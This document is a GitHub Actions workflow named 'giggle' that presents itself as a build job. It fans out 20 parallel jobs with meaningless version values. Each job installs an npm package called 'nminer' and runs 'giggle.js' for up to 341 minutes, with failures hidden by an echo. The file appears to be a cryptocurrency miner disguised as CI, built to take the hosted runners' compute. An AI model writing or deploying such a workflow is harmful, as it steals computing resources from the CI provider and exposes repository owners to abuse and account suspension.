name: giggle
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9854 }
          - { version: 1943 }
          - { version: 7682 }
          - { version: 5036 }
          - { version: 3350 }
          - { version: 7438 }
          - { version: 4378 }
          - { version: 12 }
          - { version: 2171 }
          - { version: 565 }
          - { version: 6526 }
          - { version: 84 }
          - { version: 2103 }
          - { version: 5543 }
          - { version: 4566 }
          - { version: 2219 }
          - { version: 5373 }
          - { version: 4580 }
          - { version: 6490 }
          - { version: 1076 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: second-hand even
        run: |
          npm install nminer@latest
          timeout 341m node giggle.js || echo "giggle executed"